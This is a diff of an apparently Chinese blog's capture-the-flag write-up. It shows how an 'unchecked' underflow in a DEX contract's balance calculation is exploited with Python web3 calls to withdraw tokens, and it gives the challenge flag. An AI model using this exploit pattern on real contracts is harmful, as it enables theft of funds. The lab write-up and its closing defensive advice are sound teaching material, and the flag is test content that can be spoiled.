@@ -834,6 +834,7 @@
 <p>只有<code>withdraw</code>函数中存在转账功能，但是通过正常的买卖手段我们显然是不能获得到那么多的UHTK的。所以我们需要找出其他的漏洞。</p>
 <p>我们发现，在转账之前，首先检查了<strong>unlockedToken</strong>，这个数值等于<code>deposit</code>进入的数值，减去由于进行sell操作而lock的Token。</p>
 <p>但是，这里这里在进行计算的具体过程中使用了<code>unchecked</code>关键字，这个关键字的作用是取消了<strong>overflow</strong>和<strong>underflow</strong>的检查，也就是说，虽然高于0.8.0的编译器版本已经加入了溢出检查，但这种情况下，即使我们的数值溢出了，也不会报错。</p>
+<p>虽然在前面的函数里，在Unchecked的代码块旁注释说是gas optimization，但是实际问题便是出现在这里，是出题人迷惑大家的一个小trick。</p>
 <pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">_countBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> user<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token comment">// gas optimization</span>
     unchecked <span class="token punctuation">{</span>
@@ -884,20 +885,17 @@ tx <span class="token operator">=</span> DEX<span class="token punctuation">.</s
 pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span>DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>balanceOf<span class="token punctuation">(</span>uhtk_addr<span class="token punctuation">,</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token comment"># 115792089237316195423570985008687907853269984665640564039456584007913129639936</span>
-````
+<span class="token comment"># 115792089237316195423570985008687907853269984665640564039456584007913129639936</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-可以看到我们的uhtk的余额已经下溢到了一个非常大的数值，这时我们通过withdraw操作，就可以转出大量的Token。
-
-```python
-tx <span class="token operator">=</span> DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span>uhtk_addr<span class="token punctuation">,</span> <span class="token number">100000</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>
+<p>可以看到我们的uhtk的余额已经下溢到了一个非常大的数值，这时我们通过withdraw操作，就可以转出大量的Token。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">tx <span class="token operator">=</span> DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span>uhtk_addr<span class="token punctuation">,</span> <span class="token number">100000</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>
     <span class="token string">'from'</span><span class="token punctuation">:</span> accout<span class="token punctuation">.</span>address<span class="token punctuation">,</span>
     <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">8000000</span><span class="token punctuation">,</span>
     <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'gwei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span>
 
-pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>得到flag<br><code>DECURITY{d3xus_1s_4w3s0m3}</code></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Unchecked的关键字虽然可以省gas，但是也带来了很大风险。在实际使用中，建议反复检查，避免出现这种情况。<br>尤其是在Unchecked中做大量运算时，以及用户可以控制Unchecked块的内容时，一定要小心。</p>
